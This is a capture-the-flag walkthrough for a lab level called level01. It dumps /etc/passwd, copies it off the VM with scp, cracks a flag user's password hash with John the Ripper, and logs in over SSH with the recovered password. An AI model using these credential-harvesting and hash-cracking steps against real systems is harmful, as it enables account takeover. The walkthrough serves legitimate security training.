# level01

## Steps

1. __Action__ (Guest): search for the `passwd` regular files the `level01` user can read
	```sh
	USER_OWNS_FILE="( -user $( whoami ) -exec chmod u+r {} + )"
	USER_SHARES_A_GROUP_WITH_FILE="( $( for GID in $( id -G ) ; do echo -n " -or -group ${GID}" ; done | sed 's/^ -or //' ) )"
	FILE_CAN_BE_READ="( ${USER_OWNS_FILE} -or ( ${USER_SHARES_A_GROUP_WITH_FILE} -perm /g+r ) -or -perm /o+r )"
	find / -type f -name passwd ${FILE_CAN_BE_READ} -exec ls -1 {} + 2>/dev/null
	```

2. __Observation__ (Guest): the previous command reveals several readable `passwd` files
	```
	/etc/cron.daily/passwd
	/etc/pam.d/passwd
	/etc/passwd
	/rofs/etc/cron.daily/passwd
	/rofs/etc/pam.d/passwd
	/rofs/etc/passwd
	/rofs/usr/bin/passwd
	/rofs/usr/share/lintian/overrides/passwd
	/usr/bin/passwd
	/usr/share/lintian/overrides/passwd
	```

3. __Action__ (Guest): check the content of the `/etc/passwd`,
	known to usually contain information about user accounts,
	for the `flag` users
	```sh
	cat /etc/passwd | egrep '^flag'
	```

4. __Observation__ (Guest): the previous command reveals that the `flag01` user
	is the only flag user that has its password hash stored directly in the `/etc/passwd` file,
	which is a security risk
	```
	flag00:x:3000:3000::/home/flag/flag00:/bin/bash
	flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
	flag02:x:3002:3002::/home/flag/flag02:/bin/bash
	flag03:x:3003:3003::/home/flag/flag03:/bin/bash
	flag04:x:3004:3004::/home/flag/flag04:/bin/bash
	flag05:x:3005:3005::/home/flag/flag05:/bin/bash
	flag06:x:3006:3006::/home/flag/flag06:/bin/bash
	flag07:x:3007:3007::/home/flag/flag07:/bin/bash
	flag08:x:3008:3008::/home/flag/flag08:/bin/bash
	flag09:x:3009:3009::/home/flag/flag09:/bin/bash
	flag10:x:3010:3010::/home/flag/flag10:/bin/bash
	flag11:x:3011:3011::/home/flag/flag11:/bin/bash
	flag12:x:3012:3012::/home/flag/flag12:/bin/bash
	flag13:x:3013:3013::/home/flag/flag13:/bin/bash
	flag14:x:3014:3014::/home/flag/flag14:/bin/bash
	```

5. __Action__ (Host): copy the `/etc/passwd` file from the virtual machine
	```sh
	sshpass -f level00/flag 2>/dev/null \
		scp -P 4242 level01@192.168.122.214:/etc/passwd ./snow_crash_passwd
	```

6. __Action__ (Host): use `John the Ripper` to crack the password hash
	```sh
	john snow_crash_passwd --show
	```

7. __Observation__ (Host): the previous command reveals the cracked password
	```
	flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

	1 password hash cracked, 0 left
	```

8. __Action__ (Host): try to connect as the `flag01` user with the cracked password
	```sh
	sshpass -p abcdefg 2>/dev/null \
		ssh -p 4242 flag01@192.168.122.214 \
			exit \
	&& echo 'Great! The token is correct!' \
	|| echo 'Nop, the token is incorrect!'
	```

9. __Observation__ (Host): the following message appears on stdout: `Great! The token is correct!`  
	confirming that the cracked password is indeed the password of the `flag01` user

10. __Action__ (Host): run the `getflag` command as the `flag01` user
	and save the token in the `flag` file
	```sh
	sshpass -p abcdefg 2>/dev/null \
		ssh -p 4242 flag01@192.168.122.214 \
			getflag \
	| grep -oE '[^ ]+$' >level01/flag
	```

11. __Action__(Host): remove the `snow_crash_passwd` file
	```sh
	rm snow_crash_passwd
	```
